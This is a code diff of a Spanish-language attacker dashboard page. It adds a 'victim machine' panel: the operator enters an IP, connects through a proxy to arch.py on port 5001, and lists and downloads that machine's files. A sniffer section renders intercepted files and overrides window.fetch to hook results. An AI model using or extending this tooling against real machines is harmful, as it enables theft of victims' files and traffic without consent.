@@ -574,43 +574,65 @@
                     <div class="card__header-icon">📂</div>
                     <div>
                         <h2 class="card__title">Servidor de Archivos — Máquina Víctima</h2>
-                        <p class="card__description">Visualiza y descarga los archivos subidos por la máquina atacada vía <code style="color:#00d4ff;font-family:monospace">arch.py</code></p>
+                        <p class="card__description">Conéctate a la IP de la víctima para ver y descargar los archivos que subió con <code style="color:#00d4ff;font-family:monospace">arch.py</code></p>
                     </div>
                 </div>
 
                 <div class="warning-banner" style="margin-bottom:1.25rem;">
                     <span class="warning-banner__icon">🎯</span>
                     <span>
-                        Los archivos aquí listados fueron subidos por la <strong>máquina víctima</strong>
-                        que ejecuta <strong>arch.py</strong>. Puedes descargarlos directamente desde el servidor atacante.
-                        Carpeta en el servidor: <code style="color:#00d4ff;font-family:monospace">uploads/</code>
+                        La <strong>máquina víctima</strong> debe correr <strong>arch.py</strong> (puerto 5001).
+                        Escribe su IP, presiona <strong>Conectar</strong> y podrás ver y descargar todos los
+                        archivos que subió. El servidor actúa como proxy para evitar bloqueos del navegador.
                     </span>
                 </div>
 
-                <!-- Controles -->
-                <div class="form-row" style="margin-bottom:1rem;">
+                <!-- Conexión a la víctima -->
+                <div class="form-row" style="margin-bottom:1rem; align-items:flex-end;">
+                    <div class="form-group" style="flex:1; margin-bottom:0;">
+                        <label class="form-label" for="arch-victim-ip">🖥️ IP de la Máquina Víctima</label>
+                        <input type="text" id="arch-victim-ip" class="form-input"
+                               placeholder="Ej: 192.168.1.105" autocomplete="off">
+                    </div>
                     <div class="form-group" style="margin-bottom:0;">
-                        <button type="button" id="arch-refresh-btn" class="btn btn-sniff" style="padding:0.55rem 1.2rem;">
-                            <span class="spinner" id="arch-refresh-spinner"></span>
-                            <span class="btn-text">🔄 ACTUALIZAR LISTA</span>
+                        <button type="button" id="arch-connect-btn" class="btn btn-primary">
+                            <span class="spinner" id="arch-connect-spinner"></span>
+                            <span class="btn-text">🔌 CONECTAR</span>
                         </button>
                     </div>
-                    <div class="form-group" style="margin-bottom:0; flex:1;">
-                        <input type="text" id="arch-search" class="form-input" placeholder="🔍 Filtrar archivos...">
+                    <div class="form-group" style="margin-bottom:0;">
+                        <button type="button" id="arch-refresh-btn" class="btn btn-sniff"
+                                style="padding:0.6rem 1rem;" disabled>
+                            <span class="spinner" id="arch-refresh-spinner"></span>
+                            <span class="btn-text">🔄</span>
+                        </button>
                     </div>
                 </div>
 
-                <!-- Messages -->
+                <!-- Comando para la víctima -->
+                <div class="remote-mode-box" id="arch-cmd-box" style="display:none; margin-bottom:1rem;">
+                    <div style="padding:0.75rem 1rem;">
+                        <p class="remote-hint" style="margin-bottom:0.5rem;">
+                            Ejecuta esto en la <strong>máquina víctima</strong> para levantar el servidor:
+                        </p>
+                        <div class="command-box" style="margin:0;">
+                            <code id="arch-cmd-text">python arch.py</code>
+                            <button class="copy-cmd-btn" id="arch-copy-cmd" title="Copiar">📋</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Indicador de conexión -->
                 <div id="arch-message" class="message"></div>
 
-                <!-- File Grid -->
-                <div id="arch-results" class="results">
+                <!-- Resultados -->
+                <div id="arch-results" class="results" style="display:none;">
                     <!-- Stats -->
-                    <div class="security-stats" style="grid-template-columns:repeat(3,1fr);" id="arch-stats-bar">
+                    <div class="security-stats" style="grid-template-columns:repeat(3,1fr);">
                         <div class="stat-card stat-total">
                             <span class="stat-icon">📁</span>
-                            <span class="stat-value" id="arch-stat-total">—</span>
-                            <span class="stat-label">Archivos<br><small>Subidos</small></span>
+                            <span class="stat-value" id="arch-stat-total">0</span>
+                            <span class="stat-label">Archivos<br><small>Disponibles</small></span>
                         </div>
                         <div class="stat-card stat-secure">
                             <span class="stat-icon">📦</span>
@@ -619,13 +641,16 @@
                         </div>
                         <div class="stat-card stat-plaintext">
                             <span class="stat-icon">🕐</span>
-                            <span class="stat-value" id="arch-stat-last" style="font-size:0.7rem;">—</span>
-                            <span class="stat-label">Último<br><small>Archivo</small></span>
+                            <span class="stat-value" id="arch-stat-last" style="font-size:0.68rem; line-height:1.2;">—</span>
+                            <span class="stat-label">Último<br><small>Subido</small></span>
                         </div>
                     </div>
 
-                    <div class="results__header" style="margin-top:1rem;">
-                        <span class="results__title">📋 Archivos recibidos</span>
+                    <!-- Buscador + info -->
+                    <div style="display:flex; align-items:center; gap:0.75rem; margin:1rem 0 0.6rem;">
+                        <span class="results__title" style="flex:none;">📋 Archivos recibidos</span>
+                        <input type="text" id="arch-search" class="form-input"
+                               placeholder="🔍 Filtrar..." style="flex:1; padding:0.4rem 0.75rem; font-size:0.82rem;">
                         <span class="results__count" id="arch-results-info"></span>
                     </div>
 
@@ -648,13 +673,119 @@
          (se inyectan aquí para no depender de editar style.css)
          ══════════════════════════════════════════════════════════════════════ -->
     <style>
-        /* ── Sección contenedor ── */
+        /* ── Arch file list ── */
+        .arch-file-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .arch-file-item {
+            display: flex;
+            align-items: center;
+            gap: 0.85rem;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.07);
+            border-radius: 9px;
+            padding: 0.75rem 0.95rem;
+            transition: background 0.15s, border-color 0.15s, transform 0.15s;
+            animation: archSlideIn 0.2s ease;
+        }
+
+        @keyframes archSlideIn {
+            from { opacity: 0; transform: translateX(-6px); }
+            to   { opacity: 1; transform: translateX(0); }
+        }
+
+        .arch-file-item:hover {
+            background: rgba(255,255,255,0.06);
+            border-color: rgba(0,212,255,0.2);
+            transform: translateX(3px);
+        }
+
+        .arch-file-item.hidden { display: none; }
+
+        .arch-file-icon { font-size: 1.5rem; flex-shrink: 0; }
+
+        .arch-file-info { flex: 1; min-width: 0; }
+
+        .arch-file-name {
+            font-size: 0.86rem;
+            font-weight: 600;
+            color: #e8e8f0;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .arch-file-meta {
+            font-size: 0.72rem;
+            color: #7a7a9a;
+            margin-top: 2px;
+        }
+
+        .arch-file-size {
+            font-size: 0.76rem;
+            color: #00d4ff;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .btn-arch-download {
+            flex-shrink: 0;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: linear-gradient(135deg, rgba(0,212,255,0.15), rgba(0,212,255,0.08));
+            border: 1px solid rgba(0,212,255,0.4);
+            color: #00d4ff;
+            padding: 6px 14px;
+            border-radius: 7px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            letter-spacing: 0.03em;
+            transition: background 0.15s, transform 0.1s, box-shadow 0.2s;
+        }
+
+        .btn-arch-download:hover {
+            background: rgba(0,212,255,0.22);
+            transform: translateY(-1px);
+            box-shadow: 0 0 12px rgba(0,212,255,0.2);
+        }
+
+        .arch-empty {
+            text-align: center;
+            padding: 2rem 0;
+            color: #4a4a6a;
+        }
+
+        .arch-empty .arch-empty-icon { font-size: 2.5rem; margin-bottom: 0.5rem; }
+
+        .arch-connected-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,255,157,0.08);
+            border: 1px solid rgba(0,255,157,0.3);
+            color: #00ff9d;
+            font-size: 0.8rem;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* ── Archivos interceptados (sniffer) ── */
         .intercepted-files-section {
             margin-top: 1.75rem;
-            border: 1px solid rgba(233, 69, 96, 0.45);
+            border: 1px solid rgba(233,69,96,0.45);
             border-radius: 10px;
             overflow: hidden;
-            background: rgba(233, 69, 96, 0.04);
+            background: rgba(233,69,96,0.04);
         }
 
         .intercepted-files-header {
@@ -662,8 +793,8 @@
             align-items: center;
             justify-content: space-between;
             padding: 0.75rem 1rem;
-            background: rgba(233, 69, 96, 0.12);
-            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            background: rgba(233,69,96,0.12);
+            border-bottom: 1px solid rgba(233,69,96,0.3);
         }
 
         .intercepted-files-title {
@@ -677,36 +808,25 @@
         .intercepted-files-count {
             font-size: 0.8rem;
             color: #f0a500;
-            background: rgba(240, 165, 0, 0.12);
+            background: rgba(240,165,0,0.12);
             padding: 2px 10px;
             border-radius: 20px;
-            border: 1px solid rgba(240, 165, 0, 0.3);
+            border: 1px solid rgba(240,165,0,0.3);
         }
 
-        .intercepted-warning {
-            margin: 0.75rem 1rem;
-            border-radius: 6px;
-        }
+        .intercepted-warning { margin: 0.75rem 1rem; border-radius: 6px; }
 
-        /* ── Tabla de archivos interceptados ── */
-        .intercepted-table {
-            margin: 0 0 0.75rem 0;
-        }
-
-        .intercepted-table td {
-            vertical-align: middle;
-        }
-
+        .intercepted-table   { margin: 0 0 0.75rem 0; }
+        .intercepted-table td { vertical-align: middle; }
         .intercepted-table code {
             font-size: 0.82em;
-            background: rgba(0, 212, 255, 0.08);
+            background: rgba(0,212,255,0.08);
             padding: 2px 6px;
             border-radius: 3px;
             color: #00d4ff;
             word-break: break-all;
         }
 
-        /* ── Dirección badge ── */
         .direction-badge {
             display: inline-flex;
             align-items: center;
@@ -717,20 +837,9 @@
             white-space: nowrap;
             font-weight: 600;
         }
+        .direction-badge.upload  { background: rgba(240,165,0,0.15); border: 1px solid rgba(240,165,0,0.4);  color: #f0a500; }
+        .direction-badge.download{ background: rgba(0,212,255,0.12); border: 1px solid rgba(0,212,255,0.35); color: #00d4ff; }
 
-        .direction-badge.upload {
-            background: rgba(240, 165, 0, 0.15);
-            border: 1px solid rgba(240, 165, 0, 0.4);
-            color: #f0a500;
-        }
-
-        .direction-badge.download {
-            background: rgba(0, 212, 255, 0.12);
-            border: 1px solid rgba(0, 212, 255, 0.35);
-            color: #00d4ff;
-        }
-
-        /* ── Botón descarga ── */
         .btn-intercept-download {
             display: inline-flex;
             align-items: center;
@@ -748,88 +857,58 @@
             transition: opacity 0.15s, transform 0.1s;
             white-space: nowrap;
         }
+        .btn-intercept-download:hover  { opacity: 0.85; transform: translateY(-1px); }
+        .btn-intercept-download:active { transform: translateY(0); }
 
-        .btn-intercept-download:hover {
-            opacity: 0.85;
-            transform: translateY(-1px);
-        }
-
-        .btn-intercept-download:active {
-            transform: translateY(0);
-        }
-
-        /* ── Pulse animation en el header cuando hay archivos ── */
         @keyframes pulse-red {
-
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(233, 69, 96, 0.4);
-            }
-
-            50% {
-                box-shadow: 0 0 0 6px rgba(233, 69, 96, 0);
-            }
+            0%,100% { box-shadow: 0 0 0 0 rgba(233,69,96,0.4); }
+            50%      { box-shadow: 0 0 0 6px rgba(233,69,96,0); }
         }
-
-        .intercepted-files-section.has-files {
-            animation: pulse-red 2s ease-in-out 3;
-        }
+        .intercepted-files-section.has-files { animation: pulse-red 2s ease-in-out 3; }
     </style>
 
     <script src="/static/script.js"></script>
 
     <!-- ══════════════════════════════════════════════════════════════════════
-         JS para renderizar archivos interceptados.
-         Se ejecuta después de script.js para que pueda sobreescribir/extender.
+         JS — Archivos interceptados (sniffer) + Panel Servidor de Archivos
          ══════════════════════════════════════════════════════════════════════ -->
     <script>
-        /**
-         * Escapa caracteres HTML para evitar XSS en nombres de archivo.
-         */
+        /* ──────────────────────────────────────────────────────────────
+           SNIFFER: Renderiza archivos interceptados vía HTTP
+           ────────────────────────────────────────────────────────────── */
         function escapeHtml(str) {
             return String(str || '')
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;');
+                .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
         }
 
-        /**
-         * Formatea bytes a KB / MB legibles.
-         */
         function formatSize(bytes) {
             if (!bytes) return '—';
             if (bytes < 1024) return bytes + ' B';
-            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-            return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / 1048576).toFixed(2) + ' MB';
         }
 
-        /**
-         * Renderiza la tabla de archivos interceptados.
-         * @param {Array} files  Lista de objetos devueltos por /sniff → intercepted_files
-         */
         function renderInterceptedFiles(files) {
             const section = document.getElementById('intercepted-files-section');
-            const tbody = document.getElementById('intercepted-files-body');
+            const tbody   = document.getElementById('intercepted-files-body');
             const counter = document.getElementById('intercepted-files-count');
+            if (!section || !tbody) return;
 
-            if (!files || files.length === 0) {
-                section.style.display = 'none';
-                return;
-            }
+            if (!files || files.length === 0) { section.style.display = 'none'; return; }
 
             section.style.display = 'block';
+            section.classList.remove('has-files');
+            void section.offsetWidth;
             section.classList.add('has-files');
-            counter.textContent = files.length + ' archivo' + (files.length !== 1 ? 's' : '') + ' detectado' + (files.length !== 1 ? 's' : '');
+            if (counter) counter.textContent = files.length + ' archivo' + (files.length !== 1 ? 's' : '') + ' detectado' + (files.length !== 1 ? 's' : '');
 
             tbody.innerHTML = '';
-
             files.forEach((f, idx) => {
                 const isUpload = f.direction === 'upload';
                 const dirLabel = isUpload
                     ? '<span class="direction-badge upload">⬆️ Upload</span>'
                     : '<span class="direction-badge download">⬇️ Download</span>';
-
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
                     <td>${idx + 1}</td>
@@ -837,70 +916,231 @@
                     <td><small style="color:#a0a0b0;">${escapeHtml(f.content_type || '—')}</small></td>
                     <td>${dirLabel}</td>
                     <td>${formatSize(f.size)}</td>
+                    <td><small style="color:#7a7a9a;">${escapeHtml(f.src_ip||'?')} <span style="color:#e94560;">→</span> ${escapeHtml(f.dst_ip||'?')}</small></td>
+                    <td><small style="color:#7a7a9a;">${escapeHtml(f.timestamp||'—')}</small></td>
                     <td>
-                        <small style="color:#7a7a9a;">
-                            ${escapeHtml(f.src_ip || '?')}
-                            <span style="color:#e94560;">→</span>
-                            ${escapeHtml(f.dst_ip || '?')}
-                        </small>
-                    </td>
-                    <td><small style="color:#7a7a9a;">${escapeHtml(f.timestamp || '—')}</small></td>
-                    <td>
-                        <a href="/download-intercepted/${idx}"
-                           class="btn-intercept-download"
-                           download="${escapeHtml(f.filename)}">
+                        <a href="/download-intercepted/${idx}" class="btn-intercept-download" download="${escapeHtml(f.filename)}">
                             💾 Descargar
                         </a>
-                    </td>
-                `;
+                    </td>`;
                 tbody.appendChild(tr);
             });
         }
 
-        /*
-         * Parche sobre el evento submit del formulario del sniffer.
-         * Espera a que script.js procese la respuesta y luego renderiza archivos.
-         *
-         * ESTRATEGIA: interceptamos el fetch original sobreescribiendo
-         * el listener del form DESPUÉS de que script.js lo haya registrado,
-         * usando un MutationObserver sobre #sniff-results para detectar
-         * cuándo se actualiza y disparar la renderización con los datos
-         * que guardamos en window._lastSniffData.
-         *
-         * Alternativa más simple (si tienes acceso a script.js):
-         * llama a renderInterceptedFiles(data.intercepted_files || [])
-         * dentro del .then() de tu fetch('/sniff', ...).
-         */
-
-        // Guardamos referencia al fetch original
-        const _originalFetch = window.fetch.bind(window);
-
-        window.fetch = async function (url, options) {
-            const response = await _originalFetch(url, options);
-
-            // Solo interceptamos /sniff
+        // Interceptar fetch para el sniffer
+        const _origFetch = window.fetch.bind(window);
+        window.fetch = async function(url, options) {
+            const response = await _origFetch(url, options);
             if (typeof url === 'string' && url.includes('/sniff') && !url.includes('save')) {
-                // Clonamos para no consumir el body
-                const clone = response.clone();
-                clone.json().then(data => {
-                    if (data && data.success) {
-                        renderInterceptedFiles(data.intercepted_files || []);
-                    }
-                }).catch(() => { });
+                response.clone().json().then(d => {
+                    if (d && d.success) renderInterceptedFiles(d.intercepted_files || []);
+                }).catch(() => {});
             }
-
-            // También para polling de agente remoto /agent/results/sniffer
             if (typeof url === 'string' && url.includes('/agent/results/sniffer')) {
-                const clone = response.clone();
-                clone.json().then(data => {
-                    if (data && data.success && data.intercepted_files && data.intercepted_files.length > 0) {
-                        renderInterceptedFiles(data.intercepted_files);
-                    }
-                }).catch(() => { });
+                response.clone().json().then(d => {
+                    if (d && d.success && d.intercepted_files && d.intercepted_files.length > 0)
+                        renderInterceptedFiles(d.intercepted_files);
+                }).catch(() => {});
             }
-
             return response;
         };
+
+        /* ──────────────────────────────────────────────────────────────
+           ARCH PANEL — Conexión a la máquina víctima y descarga de archivos
+           ────────────────────────────────────────────────────────────── */
+        (function initArchPanel() {
+            const ipInput       = document.getElementById('arch-victim-ip');
+            const connectBtn    = document.getElementById('arch-connect-btn');
+            const connectSpinner= document.getElementById('arch-connect-spinner');
+            const refreshBtn    = document.getElementById('arch-refresh-btn');
+            const refreshSpinner= document.getElementById('arch-refresh-spinner');
+            const msgEl         = document.getElementById('arch-message');
+            const resultsEl     = document.getElementById('arch-results');
+            const fileList      = document.getElementById('arch-file-list');
+            const searchInput   = document.getElementById('arch-search');
+            const cmdBox        = document.getElementById('arch-cmd-box');
+            const cmdText       = document.getElementById('arch-cmd-text');
+            const copyCmd       = document.getElementById('arch-copy-cmd');
+            const statTotal     = document.getElementById('arch-stat-total');
+            const statSize      = document.getElementById('arch-stat-size');
+            const statLast      = document.getElementById('arch-stat-last');
+            const resultsInfo   = document.getElementById('arch-results-info');
+
+            let currentVictimIp = '';
+            let allFiles = [];
+
+            // Mostrar comando al escribir IP
+            if (ipInput) {
+                ipInput.addEventListener('input', () => {
+                    const ip = ipInput.value.trim();
+                    if (ip && cmdBox && cmdText) {
+                        cmdBox.style.display = 'block';
+                        cmdText.textContent = `python arch.py   # en ${ip} → abre http://${ip}:5001`;
+                    } else if (cmdBox) {
+                        cmdBox.style.display = 'none';
+                    }
+                });
+
+                // Enter también conecta
+                ipInput.addEventListener('keydown', e => {
+                    if (e.key === 'Enter') connectBtn && connectBtn.click();
+                });
+            }
+
+            // Copiar comando
+            if (copyCmd && cmdText) {
+                copyCmd.addEventListener('click', () => {
+                    navigator.clipboard.writeText('python arch.py').then(() => {
+                        copyCmd.textContent = '✅';
+                        setTimeout(() => { copyCmd.textContent = '📋'; }, 2000);
+                    });
+                });
+            }
+
+            // Función de carga de archivos
+            async function loadFiles(ip) {
+                try {
+                    const resp = await _origFetch(`/arch/proxy/files?target=${encodeURIComponent(ip)}`);
+                    const data = await resp.json();
+                    return data;
+                } catch (e) {
+                    return { success: false, error: 'Error de red: ' + e.message };
+                }
+            }
+
+            // Renderizar lista de archivos
+            function renderFiles(files) {
+                allFiles = files || [];
+                if (resultsEl) resultsEl.style.display = 'block';
+
+                // Stats
+                const totalBytes = allFiles.reduce((s, f) => s + (f.size || 0), 0);
+                if (statTotal) statTotal.textContent = allFiles.length;
+                if (statSize)  statSize.textContent  = formatSize(totalBytes);
+                if (statLast)  statLast.textContent  = allFiles.length > 0 ? allFiles[0].modified : '—';
+                if (resultsInfo) resultsInfo.textContent = `${allFiles.length} archivo${allFiles.length !== 1 ? 's' : ''}`;
+
+                applyFilter();
+            }
+
+            function fileIcon(name) {
+                const ext = name.includes('.') ? name.split('.').pop().toLowerCase() : '';
+                const icons = {
+                    pdf:'📄', png:'🖼️', jpg:'🖼️', jpeg:'🖼️', gif:'🖼️', svg:'🖼️',
+                    txt:'📝', py:'🐍', js:'⚡', html:'🌐', css:'🎨',
+                    json:'📦', xml:'📋', csv:'📊', zip:'🗜️', rar:'🗜️',
+                    docx:'📝', doc:'📝', xlsx:'📊', xls:'📊',
+                    mp4:'🎥', avi:'🎥', mp3:'🎵', wav:'🎵',
+                    exe:'⚙️', sh:'💻', bat:'💻',
+                };
+                return icons[ext] || '📁';
+            }
+
+            function applyFilter() {
+                const q = (searchInput ? searchInput.value : '').toLowerCase();
+                const filtered = q ? allFiles.filter(f => f.name.toLowerCase().includes(q)) : allFiles;
+
+                if (!fileList) return;
+                fileList.innerHTML = '';
+
+                if (filtered.length === 0) {
+                    fileList.innerHTML = `
+                        <div class="arch-empty">
+                            <div class="arch-empty-icon">📭</div>
+                            <p>${allFiles.length === 0 ? 'No hay archivos subidos aún en la víctima' : 'Sin resultados para "' + escapeHtml(q) + '"'}</p>
+                        </div>`;
+                    return;
+                }
+
+                filtered.forEach(f => {
+                    const item = document.createElement('div');
+                    item.className = 'arch-file-item';
+                    item.innerHTML = `
+                        <span class="arch-file-icon">${fileIcon(f.name)}</span>
+                        <div class="arch-file-info">
+                            <div class="arch-file-name">${escapeHtml(f.name)}</div>
+                            <div class="arch-file-meta">${escapeHtml(f.modified || '—')} · ${escapeHtml((f.ext || '').toUpperCase())}</div>
+                        </div>
+                        <span class="arch-file-size">${formatSize(f.size)}</span>
+                        <a href="/arch/proxy/download?target=${encodeURIComponent(currentVictimIp)}&file=${encodeURIComponent(f.name)}"
+                           class="btn-arch-download" download="${escapeHtml(f.name)}">
+                            ⬇️ Descargar
+                        </a>`;
+                    fileList.appendChild(item);
+                });
+            }
+
+            function showMsg(type, text) {
+                if (!msgEl) return;
+                const cls = { error: 'message--error', success: 'message--success', info: 'message--info' }[type] || 'message--info';
+                msgEl.className = `message ${cls} visible`;
+                msgEl.innerHTML = text;
+            }
+
+            function hideMsg() {
+                if (msgEl) msgEl.classList.remove('visible');
+            }
+
+            // Botón CONECTAR
+            if (connectBtn) {
+                connectBtn.addEventListener('click', async () => {
+                    const ip = ipInput ? ipInput.value.trim() : '';
+                    if (!ip) {
+                        showMsg('error', '⚠️ Ingresa la IP de la máquina víctima.');
+                        return;
+                    }
+
+                    currentVictimIp = ip;
+                    connectBtn.disabled = true;
+                    if (connectSpinner) connectSpinner.classList.add('active');
+                    connectBtn.querySelector('.btn-text').textContent = 'CONECTANDO...';
+                    showMsg('info', `🔌 Conectando a ${ip}:5001...`);
+
+                    const data = await loadFiles(ip);
+
+                    connectBtn.disabled = false;
+                    if (connectSpinner) connectSpinner.classList.remove('active');
+                    connectBtn.querySelector('.btn-text').textContent = '🔌 CONECTAR';
+
+                    if (data.success) {
+                        msgEl.innerHTML = `<span class="arch-connected-badge">🟢 Conectado a ${escapeHtml(ip)}:5001 — arch.py activo</span>`;
+                        msgEl.className = 'message visible';
+                        if (refreshBtn) refreshBtn.disabled = false;
+                        renderFiles(data.files || []);
+                    } else {
+                        showMsg('error', `❌ ${escapeHtml(data.error || 'Error desconocido')}`);
+                        if (resultsEl) resultsEl.style.display = 'none';
+                    }
+                });
+            }
+
+            // Botón REFRESCAR
+            if (refreshBtn) {
+                refreshBtn.addEventListener('click', async () => {
+                    if (!currentVictimIp) return;
+                    refreshBtn.disabled = true;
+                    if (refreshSpinner) refreshSpinner.classList.add('active');
+
+                    const data = await loadFiles(currentVictimIp);
+
+                    refreshBtn.disabled = false;
+                    if (refreshSpinner) refreshSpinner.classList.remove('active');
+
+                    if (data.success) {
+                        renderFiles(data.files || []);
+                        msgEl.innerHTML = `<span class="arch-connected-badge">🟢 Conectado a ${escapeHtml(currentVictimIp)}:5001 — actualizado</span>`;
+                        msgEl.className = 'message visible';
+                    } else {
+                        showMsg('error', `❌ ${escapeHtml(data.error || 'Error al actualizar')}`);
+                    }
+                });
+            }
+
+            // Filtro de búsqueda
+            if (searchInput) {
+                searchInput.addEventListener('input', applyFilter);
+            }
+        })();
     </script>
 
 </body>
